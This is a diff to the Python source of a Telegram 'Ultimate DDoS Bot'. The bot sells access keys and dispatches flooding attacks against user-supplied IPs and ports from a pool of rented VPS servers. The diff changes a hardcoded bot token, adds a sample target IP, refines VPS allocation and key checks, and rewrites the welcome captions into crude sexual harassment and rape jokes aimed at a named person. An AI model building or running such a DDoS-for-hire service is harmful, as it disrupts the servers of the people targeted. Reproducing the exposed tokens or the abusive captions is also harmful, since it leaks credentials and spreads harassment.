@@ -5,17 +5,12 @@ import logging
 import asyncio
 import random
 import json
-import shutil
-import uuid
-import telegram
-from collections import defaultdict
 from telegram import Update, ReplyKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import CallbackQueryHandler
 from telegram.ext import ChatMemberHandler
 from telegram.helpers import escape_markdown
-import datetime
 import paramiko
 from scp import SCPClient
 import sys
@@ -39,7 +34,7 @@ BOT_CONFIG_FILE = "bot_configs.json"
 BOT_DATA_DIR = "bot_data"  # Directory to store each bot's data
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '7623380258:AAHtmKVKzNvumZyU0-GdOZ2WJ3a5XJSeMxw'
+TELEGRAM_BOT_TOKEN = '7064980384:AAGfNFTaf81DF3P4NLhHm0TRBSEV1XfBATw'
 OWNER_USERNAME = "Riyahacksyt"
 CO_OWNERS = []  # List of user IDs for co-owners
 OWNER_CONTACT = "Contact @rtt to buy keys"
@@ -55,17 +50,9 @@ BOT_START_TIME = time.time()
 GROUP_DISPLAY_NAMES = {}  # Key: group_id, Value: display_name
 DISPLAY_NAME_FILE = "display_names.json"
 
-# Logging Configuration
-LOG_FILE = "button_logs.json"
-LOG_DATA = defaultdict(list)
-
 # Link Management
 LINK_FILE = "links.json"
 LINKS = {}
-
-# Force Join Configuration
-FORCE_JOIN_ENABLED = False
-FORCE_JOIN_CHANNEL = "@lalanub120"  # Change this to your channel
 
 # VPS Configuration
 VPS_FILE = "vps.txt"
@@ -120,118 +107,132 @@ START_IMAGES = [
     {
         'url': 'https://www.craiyon.com/image/Mfze8oH8SbO8IDZQZb36Tg',
         'caption': (
-            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
-            '🌐 Multi VPS Attack Coordination\n\n'
-            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad\n\n'
-            ' JOIN CHANNEL  @RipServerGroup ''\n\n'
+            '🔥 *Welcome to the Ultimate DDoS Bot !*' + '\n\n'
+            '💻 *Example:* `20.235.43.9 14533 120 100`' + '\n\n'
+            '💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad*' + '\n\n'
+            '⚠️ *RIYAAZ RITIK KA DUSRA BAAP🤬*⚠️' + '\n\n'
+            '⚠️ *JOIN CHANNEL  @NXR_TEAMALL *' + '\n\n'
         )
     },
     {
         'url': 'https://www.craiyon.com/image/KC4CfJPuQTuKdSdlrkiczg',
         'caption':(
-            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
-            '🌐 Multi VPS Attack Coordination\n\n'
-            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad\n\n'
-            ' JOIN CHANNEL  @RipServerGroup \n\n'
+            '🔥 *Welcome to the Ultimate DDoS Bot!*\n\n'
+            '💻 *Example:* `20.235.43.9 14533 120 100`\n\n'
+            '💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad* \n\n'
+            '⚠️ *RIYAAZ RITIK KA DUSRA BAAP🤬* ⚠️\n\n'
+            '⚠️ *JOIN CHANNEL  @NXR_TEAMALL  *' + '\n\n'
         )
     },
     {
         'url': 'https://www.craiyon.com/image/A3ol0NRAQc2N3C62DXcfpA',
         'caption': (
-            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
-            '🌐 Multi VPS Attack Coordination\n\n'
-            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad \n\n'
-            ' JOIN CHANNEL  @RipServerGroup\n\n'
+            '🔥 *Welcome to the Ultimate DDoS Bot!*\n\n'
+            '💻 *Example:* `20.235.43.9 14533 120 100`\n\n'
+            '💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad* \n\n'
+            '⚠️ *RITIK KI MAMMY CHUT ME HATHI KA LUND🤬* ⚠️\n\n'
+            '⚠️ *JOIN CHANNEL  @NXR_TEAMALL  *' + '\n\n'
         )
     },
     {
         'url': 'https://www.craiyon.com/image/IErJnUlDTkCvcWBeTZX8qQ',
         'caption': (
-            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
-            '🌐 Multi VPS Attack Coordination\n\n'
-            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad\n\n'
-            ' JOIN CHANNEL  @RipServerGroup \n\n'
+            '🔥 *Welcome to the Ultimate DDoS Bot!*\n\n'
+            '💻 *Example:* `20.235.43.9 14533 120 100`\n\n'
+            '💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad* \n\n'
+            '⚠️ *RAJA RITIK KA PEHLA BAAP🤬* \n\n'
+            '⚠️ *JOIN CHANNEL  @NXR_TEAMALL *' + '\n\n'
             
         )
     },
     {
         'url': 'https://www.craiyon.com/image/073Vnr7jQpGUkSMr6Rrvjw',
         'caption': (
-            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
-            '🌐 Multi VPS Attack Coordination\n\n'
-            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad \n\n'
-            ' JOIN CHANNEL  @RipServerGroup\n\n'
+            '🔥 *Welcome to the Ultimate DDoS Bot!*\n\n'
+            '💻 *Example:* `20.235.43.9 14533 120 100`\n\n'
+            '💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad* \n\n'
+            '⚠️ *RITIK KI MUMMY KO MOTE LUND SE CHODNE WALA S2 FLASH* \n\n'
+            '⚠️ *JOIN CHANNEL  @NXR_TEAMALL  *' + '\n\n'
         )
     },
     {
         'url': 'https://www.craiyon.com/image/XgSNsdopTYGnlDsVC4PnSw',
         'caption': (
-            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
-            '🌐 Multi VPS Attack Coordination\n\n'
-            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad\n\n'
-            ' JOIN CHANNEL  @RipServerGroup \n\n'
+            '🔥 *Welcome to the Ultimate DDoS Bot!*\n\n'
+            '💻 *Example:* `20.235.43.9 14533 120 100`\n\n'
+            '💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad* \n\n'
+            '⚠️ *DEMON NE RITIK KI MUMMY KE BLOUSE SILNE KE BAHANE USKE BOOBS DABA DIYE* \n\n'
+            '⚠️ *JOIN CHANNEL  @NXR_TEAMALL *' + '\n\n'
         )
     },
     {
         'url': 'https://www.craiyon.com/image/JbBsmO9RQcy2CKQiOf_MOw',
         'caption': (
-            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
-            '🌐 Multi VPS Attack Coordination\n\n'
-            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad \n\n'
-            ' JOIN CHANNEL  @RipServerGroup\n\n'
+            '🔥 *Welcome to the Ultimate DDoS Bot!*\n\n'
+            '💻 *Example:* `20.235.43.9 14533 120 100`\n\n'
+            '💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad* \n\n'
+            '⚠️ *4 LOGO NE MILKE RITIK KI MUMMY KA KIYA RAPE OR CHUT PHAAD DI* \n\n'
+            '⚠️ *JOIN CHANNEL  @NXR_TEAMALL  *' + '\n\n'
         )
     },
     {
         'url': 'https://www.craiyon.com/image/yF1wqEx7TuuAfoBLK0Zmag',
         'caption': (
-            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
-            '🌐 Multi VPS Attack Coordination\n\n'
-            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad \n\n'
-            ' JOIN CHANNEL  @RipServerGroup\n\n'
+            '🔥 *Welcome to the Ultimate DDoS Bot!*\n\n'
+            '💻 *Example:* `20.235.43.9 14533 120 100`\n\n'
+            '💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad* \n\n'
+            '⚠️ *MERE GROUP KA HAR BANDA RITIK KI MUMMY KA YAAR HA* \n\n'
+            '⚠️ *JOIN CHANNEL  @NXR_TEAMALL *' + '\n\n'
         )
     },
     {
         'url': 'https://www.craiyon.com/image/XuS2HNGdTFKqGkpAGzzrqg',
         'caption': (
-            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
-            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad \n\n'
-            ' JOIN CHANNEL  @RipServerGroup \n\n'
+            '🔥 *Welcome to the Ultimate DDoS Bot!*\n\n'
+            '💻 *Example:* `20.235.43.9 14533 120 100`\n\n'
+            '💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad* 💀\n\n'
+            '⚠️ *RITIK KI MUMMY KI GND KE CHED KA SIZE KITNA HA* ⚠️\n\n'
+            '⚠️ *JOIN CHANNEL  @NXR_TEAMALL  *' + '\n\n'
         )
     },
     {
         'url': 'https://www.craiyon.com/image/iRyN9awaQIeFgjqVVucIlA',
         'caption': (
-            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
-            '🌐 Multi VPS Attack Coordination\n\n'
-            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad \n\n'
-            ' JOIN CHANNEL  @RipServerGroup \n\n'
+            '🔥 *Welcome to the Ultimate DDoS Bot!*\n\n'
+            '💻 *Example:* `20.235.43.9 14533 120 100`\n\n'
+            '💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad* 💀\n\n'
+            '⚠️ *⚠️LATEST NEWS⚠️ RITIK KI MUMMY KO 9000 THREDS PE CHODA * \n\n'
+            '⚠️ *JOIN CHANNEL  @NXR_TEAMALL  *' + '\n\n'
         )
     },
     {
         'url': 'https://www.craiyon.com/image/bAhq_xScRm-wk-hD9GzUrw',
         'caption': (
-            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
-            '🌐 Multi VPS Attack Coordination\n\n'
-            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad \n\n'
-            ' JOIN CHANNEL  @RipServerGroup\n\n'
+            '🔥 *Welcome to the Ultimate DDoS Bot!*\n\n'
+            '💻 *Example:* `20.235.43.9 14533 120 100`\n\n'
+            '💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad* 💀\n\n'
+            '⚠️ *⚠️LATEST NEWS⚠️ RITIK KI MUMMY GHODE GAND MARWATE HUE PAKDI GYI* ⚠️\n\n'
+            '⚠️ *JOIN CHANNEL  @NXR_TEAMALL  *' + '\n\n'
        )
     },
     {
         'url': 'https://mobilehd.blob.core.windows.net/main/2017/02/girl-sexy-black-swimsuit-look-1080x1920.jpg',
         'caption':(
-            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
-            '🌐 Multi VPS Attack Coordination\n\n'
-            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad \n\n'
-            ' JOIN CHANNEL @RipServerGroup \n\n'
+            '🔥 *Welcome to the Ultimate DDoS Bot!*\n\n'
+            '💻 *Example:* `20.235.43.9 14533 120 100`\n\n'
+            '💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad* 💀\n\n'
+            '⚠️ *RITIK KA BAAP GAY HA USKA ASLI BAAP S2 FLASH HA* ⚠️\n\n'
+            '⚠️ *JOIN CHANNEL  @NXR_TEAMALL  *' + '\n\n'
         )
     },
     {
         'url': 'https://s2.best-wallpaper.net/wallpaper/iphone/2007/Beautiful-long-hair-girl-look-sunshine-summer_iphone_640x1136.jpg',
         'caption':(
-            '🔥 Welcome to the Ultimate DDoS Bot\n\n'
-            '🌐 Multi VPS Attack Coordination\n\n'
-            '💀 Bsdk threads ha 100 dalo time 120 dalne ke baad\n\n'
-            ' JOIN CHANNEL @@RipServerGroup \n\n'
+            '🔥 *Welcome to the Ultimate DDoS Bot!*\n\n'
+            '💻 *Example:* `20.235.43.9 14533 120 100`\n\n'
+            '💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad* \n\n'
+            '⚠️ *S2 FLASH NE RITIK KI MUMMY KO 1024 BYTE PE CHOD OR ABB CHUT KA SIZE 50CM HA* ⚠️\n\n'
+            '⚠️ *JOIN CHANNEL  @NXR_TEAMALL *' + '\n\n'
         )
     },
 ]
@@ -274,10 +275,10 @@ reseller_markup = ReplyKeyboardMarkup(reseller_keyboard, resize_keyboard=True)
 
 # Settings menu keyboard with Reset VPS button
 settings_keyboard = [
-    ['Keys', 'Add Reseller'],
-    ['Remove Reseller', 'Add Coin'],
-    ['Set Cooldown', 'Reset VPS'],
-    ['Back to Home']
+    ['Set Duration', 'Add Reseller'],
+    ['Remove Reseller', 'Set Threads'],
+    ['Add Coin', 'Set Cooldown'],
+    ['Reset VPS', 'Back to Home']
 ]
 settings_markup = ReplyKeyboardMarkup(settings_keyboard, resize_keyboard=True)
 
@@ -287,7 +288,6 @@ owner_settings_keyboard = [
     ['Bot List', 'Start Selected Bot'],
     ['Stop Selected Bot', 'Promote'],
     ['🔗 Manage Links', '📢 Broadcast'],
-    ['Change Channel', '📜 View Logs'],
     ['Back to Home']
 ]
 owner_settings_markup = ReplyKeyboardMarkup(owner_settings_keyboard, resize_keyboard=True)
@@ -296,8 +296,8 @@ owner_keyboard = [
     ['/Start', 'Attack', 'Redeem Key'],
     ['Rules', 'Settings', 'Generate Key'],
     ['Delete Key', '🔑 Special Key', '⏳ Uptime'],
-    ['OpenBot', 'CloseBot', '👥 Check Users'],
-    ['⚙️ Owner Settings', 'Menu', 'Force On', 'Force Off']
+    ['OpenBot', 'CloseBot', 'Menu'],
+    ['⚙️ Owner Settings', '👥 Check Users']
 ]
 owner_markup = ReplyKeyboardMarkup(owner_keyboard, resize_keyboard=True)
 
@@ -322,9 +322,9 @@ owner_menu_markup = ReplyKeyboardMarkup(owner_menu_keyboard, resize_keyboard=Tru
 
 co_owner_menu_keyboard = [
     ['Add Group ID', 'Remove Group ID'],
-    ['RE Status', 'Add VPS'],
-    ['Set Display Name', 'Back to Home' ]
-    
+    ['RE Status', 'VPS Status'],
+    ['Set Display Name', 'Add VPS'],
+    ['Back to Home']
 ]
 co_owner_menu_markup = ReplyKeyboardMarkup(co_owner_menu_keyboard, resize_keyboard=True)
 
@@ -361,141 +361,6 @@ CONFIRM_BINARY_DELETE = 29
 GET_LINK_NUMBER = 30
 GET_LINK_URL = 31
 GET_BROADCAST_MESSAGE = 31
-GET_CHANNEL_NAME = 32  # Add this with the other state constants
-
-
-
-def log_button_click(user_id: int, username: str, button_name: str, chat_type: str, group_id: int = None):
-    """Log button clicks to a JSON file"""
-    log_entry = {
-        "id": str(uuid.uuid4()),
-        "timestamp": datetime.datetime.now().isoformat(),
-        "user_id": user_id,
-        "username": username,
-        "button_name": button_name,
-        "chat_type": chat_type,
-        "group_id": group_id if group_id else None
-    }
-    
-    LOG_DATA["logs"].append(log_entry)
-    
-    # Save to file
-    with open(LOG_FILE, 'w') as f:
-        json.dump(LOG_DATA, f, indent=2)
-
-async def send_logs_to_owner(context: CallbackContext):
-    """Send the log file to the owner"""
-    if not os.path.exists(LOG_FILE):
-        return
-    
-    try:
-        with open(LOG_FILE, 'rb') as f:
-            await context.bot.send_document(
-                chat_id=OWNER_USERNAME,
-                document=f,
-                caption="📊 Button Click Logs"
-            )
-    except Exception as e:
-        logging.error(f"Error sending logs to owner: {e}")
-
-async def view_logs(update: Update, context: CallbackContext):
-    if not is_owner(update):
-        await update.message.reply_text("❌ Only owner can view logs!", parse_mode='Markdown')
-        return
-    
-    if not os.path.exists(LOG_FILE):
-        await update.message.reply_text("No logs available yet.", parse_mode='Markdown')
-        return
-    
-    try:
-        with open(LOG_FILE, 'rb') as f:
-            await update.message.reply_document(
-                document=f,
-                caption="📊 Button Click Logs"
-            )
-    except Exception as e:
-        logging.error(f"Error sending logs: {e}")
-        await update.message.reply_text("Error loading logs.", parse_mode='Markdown')
-
-async def force_join_on(update: Update, context: CallbackContext):
-    """Enable force join requirement"""
-    if not (is_owner(update) or is_co_owner(update)):
-        await update.message.reply_text("❌ Only owner or co-owners can enable force join!", parse_mode='Markdown')
-        return
-    
-    global FORCE_JOIN_ENABLED
-    FORCE_JOIN_ENABLED = True
-    
-    await update.message.reply_text(
-        f"✅ Force Join enabled!\n\n"
-        f"Users must join {FORCE_JOIN_CHANNEL} before attacking.\n"
-        f"Key holders can still attack without joining.",
-        parse_mode='Markdown'
-    )
-
-async def force_join_off(update: Update, context: CallbackContext):
-    """Disable force join requirement"""
-    if not (is_owner(update) or is_co_owner(update)):
-        await update.message.reply_text("❌ Only owner or co-owners can disable force join!", parse_mode='Markdown')
-        return
-    
-    global FORCE_JOIN_ENABLED
-    FORCE_JOIN_ENABLED = False
-    
-    await update.message.reply_text(
-        "✅ Force Join disabled!\n\n"
-        "Users now need valid keys for all attacks.\n"
-        "Channel membership no longer grants access.",
-        parse_mode='Markdown'
-    )
-
-async def check_channel_membership(user_id: int, context: CallbackContext, channel: str) -> bool:
-    """Check if a user is a member of the specified channel with robust error handling."""
-    if not isinstance(user_id, int) or user_id <= 0:
-        logging.error(f"Invalid user_id {user_id} when checking channel membership")
-        return False
-    
-    if not channel.startswith('@') and not channel.startswith('-100'):
-        logging.error(f"Invalid channel format: {channel}")
-        return False
-
-    try:
-        # First verify the user exists
-        try:
-            user = await context.bot.get_chat(user_id)
-            if not user:
-                logging.error(f"User {user_id} not found")
-                return False
-        except Exception as e:
-            logging.error(f"Error verifying user {user_id}: {str(e)}")
-            return False
-
-        # Now check channel membership
-        try:
-            chat_member = await context.bot.get_chat_member(
-                chat_id=channel,
-                user_id=user_id
-            )
-            return chat_member.status not in ['left', 'kicked']
-        except telegram.error.BadRequest as e:
-            if "user not found" in str(e).lower():
-                logging.error(f"User {user_id} not found when checking channel membership")
-            elif "chat not found" in str(e).lower():
-                logging.error(f"Channel {channel} not found")
-            else:
-                logging.error(f"BadRequest when checking channel membership: {e}")
-            return False
-        except Exception as e:
-            logging.error(f"Unexpected error checking channel membership: {e}")
-            return False
-
-    except Exception as e:
-        logging.error(f"General error in check_channel_membership: {e}")
-        return False
-
-
-
-
 
 def get_uptime():
     uptime_seconds = int(time.time() - BOT_START_TIME)
@@ -542,35 +407,6 @@ async def set_display_name(update: Update, new_name: str, group_id=None):
             parse_mode='Markdown'
         )
 
-
-async def change_channel_name_start(update: Update, context: CallbackContext):
-    if not (is_owner(update) or is_co_owner(update)):
-        await update.message.reply_text("❌ Only owner or co-owners can change channel name!", parse_mode='Markdown')
-        return ConversationHandler.END
-    
-    await update.message.reply_text(
-        "⚠️ Enter the new channel name (e.g., @MyNewChannel):",
-        parse_mode='Markdown'
-    )
-    return GET_CHANNEL_NAME
-
-async def change_channel_name_input(update: Update, context: CallbackContext):
-    new_channel = update.message.text.strip()
-    
-    # Update all captions in START_IMAGES
-    for image in START_IMAGES:
-        if "JOIN CHANNEL" in image['caption']:
-            # Find the existing channel name and replace it
-            parts = image['caption'].split("JOIN CHANNEL")
-            if len(parts) > 1:
-                # Keep everything before "JOIN CHANNEL" and add new channel
-                image['caption'] = parts[0] + "JOIN CHANNEL " + new_channel
-    
-    await update.message.reply_text(
-        f"✅ Channel name updated to: {new_channel}",
-        parse_mode='Markdown'
-    )
-    return ConversationHandler.END
 
 # Add this function
 async def promote(update: Update, context: CallbackContext):
@@ -954,11 +790,7 @@ def is_authorized_user(update: Update):
     return is_owner(update) or is_co_owner(update) or is_reseller(update)
 
 def get_random_start_image():
-    image = random.choice(START_IMAGES)
-    # Escape the caption
-    image['caption'] = escape_markdown(image['caption'], version=2)
-    return image
-
+    return random.choice(START_IMAGES)
 
 async def reset_vps(update: Update, context: CallbackContext):
     """Reset all busy VPS to make them available again"""
@@ -1207,15 +1039,15 @@ async def add_owner_username(update: Update, context: CallbackContext):
     with open(DISPLAY_NAME_FILE, 'w') as f:
         json.dump(GROUP_DISPLAY_NAMES, f)
     
-    # Escape Markdown characters in the token and username
+    # Escape Markdown characters in the token display
     display_token = escape_markdown(token[:10] + "...", version=2)
     display_username = escape_markdown(owner_username, version=2)
     
     await update.message.reply_text(
-        f"✅ New bot instance added and started\!\n\n"
+        f"✅ New bot instance added and started!\n\n"
         f"Token: `{display_token}`\n"
         f"Owner: @{display_username}\n\n"
-        f"Use `/stopbot_{len(configs)-1}` to stop this instance\.",
+        f"Use /stopbot_{len(configs)-1} to stop this instance.",
         parse_mode='MarkdownV2'
     )
     return ConversationHandler.END
@@ -1453,41 +1285,45 @@ async def start(update: Update, context: CallbackContext):
     user = update.effective_user
     image = get_random_start_image()
 
-    # Track this interaction
+     # Track this interaction
     if 'users_interacted' not in context.bot_data:
         context.bot_data['users_interacted'] = set()
     context.bot_data['users_interacted'].add(user.id)
     
     current_display_name = get_display_name(chat.id if chat.type in ['group', 'supergroup'] else None)
     
+    modified_caption = (
+        f"{image['caption']}\n\n"
+    )
+    
     if chat.type == "private":
         if not is_authorized_user(update):
             await update.message.reply_photo(
                 photo=image['url'],
-                caption="❌ This bot is not authorized to use here.",
-                parse_mode=None  # Disable markdown parsing for this message
+                caption=f"❌ *This bot is not authorized to use here.*\n\n",
+                parse_mode='Markdown'
             )
             return
 
         if is_owner(update):
             await update.message.reply_photo(
                 photo=image['url'],
-                caption=image['caption'],
-                parse_mode=None,  # Disable markdown parsing or properly escape text
+                caption=modified_caption,
+                parse_mode='Markdown',
                 reply_markup=owner_markup
             )
         elif is_co_owner(update):
             await update.message.reply_photo(
                 photo=image['url'],
-                caption=image['caption'],
-                parse_mode=None,  # Disable markdown parsing or properly escape text
+                caption=modified_caption,
+                parse_mode='Markdown',
                 reply_markup=co_owner_markup
             )
         else:
             await update.message.reply_photo(
                 photo=image['url'],
-                caption=image['caption'],
-                parse_mode=None,  # Disable markdown parsing or properly escape text
+                caption=modified_caption,
+                parse_mode='Markdown',
                 reply_markup=reseller_markup
             )
         return
@@ -1497,8 +1333,8 @@ async def start(update: Update, context: CallbackContext):
 
     await update.message.reply_photo(
         photo=image['url'],
-        caption=image['caption'],
-        parse_mode=None,  # Disable markdown parsing or properly escape text
+        caption=modified_caption,
+        parse_mode='Markdown',
         reply_markup=group_user_markup
     )
 
@@ -1507,7 +1343,22 @@ async def generate_key_start(update: Update, context: CallbackContext):
         await update.message.reply_text("❌ *Only the owner, co-owners or resellers can generate keys!*", parse_mode='Markdown')
         return ConversationHandler.END
 
-    await update.message.reply_text("⚠️ *Enter the duration for the key (e.g., 1H for 1 hour or 1D for 1 day).*", parse_mode='Markdown')
+    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    
+    # Create a list of available key durations with their prices
+    key_options = []
+    for duration, price in KEY_PRICES.items():
+        if is_reseller(update):
+            key_options.append(f"{duration} - {price} coins")
+        else:
+            key_options.append(duration)
+    
+    await update.message.reply_text(
+        f"⚠️ *Select key duration:*\n\n"
+        f"{'\n'.join(key_options)}\n\n"
+        f"👑 *Bot Owner:* {current_display_name}",
+        parse_mode='Markdown'
+    )
     return GET_DURATION
 
 async def generate_key_duration(update: Update, context: CallbackContext):
@@ -1688,7 +1539,6 @@ async def redeem_key_input(update: Update, context: CallbackContext):
 
 async def attack_start(update: Update, context: CallbackContext):
     chat = update.effective_chat
-    user_id = update.effective_user.id
 
     if chat.type == "private":
         if not is_authorized_user(update):
@@ -1713,22 +1563,17 @@ async def attack_start(update: Update, context: CallbackContext):
         )
         return ConversationHandler.END
 
-    # Check if user has a valid key
-    user_has_key = user_id in redeemed_users and (
-        (isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id]['expiration_time'] > time.time()) or
-        (isinstance(redeemed_users[user_id], (int, float)) and redeemed_users[user_id] > time.time())
-    )
-    
-    # Check if bot is open (no key needed)
+    user_id = update.effective_user.id
+
+    # Fixed condition with proper parentheses
     user_has_access = False
     if bot_open:
         user_has_access = True
-    elif user_has_key:
-        user_has_access = True
-    elif FORCE_JOIN_ENABLED:
-        # Only check channel membership if force join is enabled
-        is_member = await check_channel_membership(user_id, context, FORCE_JOIN_CHANNEL)
-        if is_member:
+    elif user_id in redeemed_users:
+        if isinstance(redeemed_users[user_id], dict):
+            if redeemed_users[user_id].get('is_special', False):
+                user_has_access = True
+        elif isinstance(redeemed_users[user_id], (int, float)):
             user_has_access = True
 
     if user_has_access:
@@ -1736,26 +1581,19 @@ async def attack_start(update: Update, context: CallbackContext):
         
         await update.message.reply_text(
             "⚠️ *Enter the attack arguments: <ip> <port> <duration> <threads>*\n\n"
-            f"ℹ️ *Max duration: {max_duration} sec for channel members, {SPECIAL_MAX_DURATION} sec for key holders.*\n\n"
-            f"🔑 *Buy keys from {current_display_name} for extended features*",
+            f"ℹ️ *When bot is open, max duration is {max_duration} sec. For {SPECIAL_MAX_DURATION} sec, you need a key.*\n\n"
+            f"🔑 *Buy keys from {current_display_name}*",
             parse_mode='Markdown'
         )
         return GET_ATTACK_ARGS
     else:
         current_display_name = get_display_name(update.effective_chat.id)
         
-        if FORCE_JOIN_ENABLED:
-            await update.message.reply_text(
-                f"❌ *You must join {FORCE_JOIN_CHANNEL} to attack!*\n\n"
-                f"🔑 *Or buy a key from {current_display_name} for uninterrupted access*",
-                parse_mode='Markdown'
-            )
-        else:
-            await update.message.reply_text(
-                f"❌ *You need a valid key to attack!*\n\n"
-                f"🔑 *Buy keys from {current_display_name}*",
-                parse_mode='Markdown'
-            )
+        await update.message.reply_text(
+            "❌ *You need a valid key to start an attack!*\n\n"
+            f"🔑 *Buy keys from {current_display_name}*",
+            parse_mode='Markdown'
+        )
         return ConversationHandler.END
 
 async def attack_input(update: Update, context: CallbackContext):
@@ -1768,7 +1606,7 @@ async def attack_input(update: Update, context: CallbackContext):
         await update.message.reply_text(
             f"❌ *Invalid input! Please enter <ip> <port> <duration> <threads>*\n\n"
             f"👑 *Bot Owner:* {current_display_name}\n"
-            f"💬 *Need a key? DM:* {current_display_name}",
+            f"💬 *Need a key for 200s? DM:* {current_display_name}",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
@@ -1777,30 +1615,40 @@ async def attack_input(update: Update, context: CallbackContext):
     duration = int(duration)
     threads = int(threads)
 
-    user_id = update.effective_user.id
+    # Check if all VPS are busy
+    busy_vps = [attack['vps_ip'] for attack in running_attacks.values() if 'vps_ip' in attack]
+    available_vps = [vps[0] for vps in VPS_LIST if vps[0] not in busy_vps]
     
-    # Check user's permissions
-    is_member = await check_channel_membership(user_id, context, FORCE_JOIN_CHANNEL)
+    if not available_vps and VPS_LIST:  # If no VPS available but we have VPS configured
+        busy_list = "\n".join(set(busy_vps))  # Get unique VPS IPs
+        await update.message.reply_text(
+            f"❌ *All VPS are currently busy with attacks!*\n\n"
+            f"🚦 *Currently busy VPS:*\n{busy_list}\n\n"
+            f"Please try again later.",
+            parse_mode='Markdown'
+        )
+        return ConversationHandler.END
+
+    user_id = update.effective_user.id
     is_special = False
     
     if user_id in redeemed_users:
         if isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'):
             is_special = True
-            max_allowed_duration = SPECIAL_MAX_DURATION
-            max_allowed_threads = SPECIAL_MAX_THREADS
-        elif isinstance(redeemed_users[user_id], (int, float)) and redeemed_users[user_id] > time.time():
-            max_allowed_duration = max_duration  # Regular key holders get standard limits
-            max_allowed_threads = MAX_THREADS
-    elif is_member:
-        # Channel members get basic access
-        max_allowed_duration = 120  # 2 minutes for channel members
-        max_allowed_threads = 1000
-    else:
+    
+    if duration > max_duration and not is_special:
+        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+        
         await update.message.reply_text(
-            "❌ *Access denied! Join the channel or get a key.*",
+            f"❌ *Attack duration exceeds 120 seconds!*\n"
+            f"🔑 *For 200 seconds attacks, you need a special key.*\n\n"
+            f"👑 *Buy keys from:* {current_display_name}",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
+
+    max_allowed_duration = SPECIAL_MAX_DURATION if is_special else max_duration
+    max_allowed_threads = SPECIAL_MAX_THREADS if is_special else MAX_THREADS
 
     if duration > max_allowed_duration:
         current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
@@ -1822,11 +1670,10 @@ async def attack_input(update: Update, context: CallbackContext):
         )
         return ConversationHandler.END
 
-    # Rest of the attack logic remains the same...
     last_attack_time = time.time()
     
     # Select a random available VPS
-    selected_vps_ip = random.choice([vps[0] for vps in VPS_LIST]) if VPS_LIST else "localhost"
+    selected_vps_ip = random.choice(available_vps) if available_vps else "localhost"
     
     attack_id = f"{ip}:{port}-{time.time()}"
     running_attacks[attack_id] = {
@@ -1848,11 +1695,9 @@ async def attack_input(update: Update, context: CallbackContext):
         f"🧵 *Threads*: {threads}\n"
         f"🌐 *VPS Used*: `{selected_vps_ip}`\n"
         f"👑 *Bot Owner:* {current_display_name}\n\n"
-        f"🔥 *Attack launched successfully!*",
+        f"🔥 *RITIK KI MUMMY CHODNA CHALU HO GY HA! 💥*",
         parse_mode='Markdown'
     )
-
-    # Rest of the attack execution code...
 
     async def run_attack():
         try:
@@ -3024,19 +2869,6 @@ async def co_owner_management(update: Update, context: CallbackContext):
     )
 
 async def handle_button_click(update: Update, context: CallbackContext):
-
-    user = update.effective_user
-    chat = update.effective_chat
-
-
-    button_name = update.message.text if update.message else update.callback_query.data
-    log_button_click(
-        user_id=user.id,
-        username=user.username or user.full_name,
-        button_name=button_name,
-        chat_type=chat.type,
-        group_id=chat.id if chat.type in ['group', 'supergroup'] else None
-    )
     # First check if this is a callback query (button press)
     if update.callback_query:
         await update.callback_query.answer()
@@ -3073,8 +2905,6 @@ async def handle_button_click(update: Update, context: CallbackContext):
         await attack_start(update, context)
     elif query == 'Set Duration':
         await set_duration_start(update, context)
-    elif query == 'Change Channel':
-        await change_channel_name_start(update, context)      
     elif query == 'Settings':
         await settings_menu(update, context)
     elif query == 'Co-Owner':
@@ -3242,14 +3072,6 @@ def main():
             GET_SET_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_duration_input)],
         },
         fallbacks=[CommandHandler("cancel", cancel_conversation)],
-    )
-     # Add this with the other conversation handlers
-    change_channel_handler = ConversationHandler(
-        entry_points=[MessageHandler(filters.Text("Change Channel"), change_channel_name_start)],
-        states={
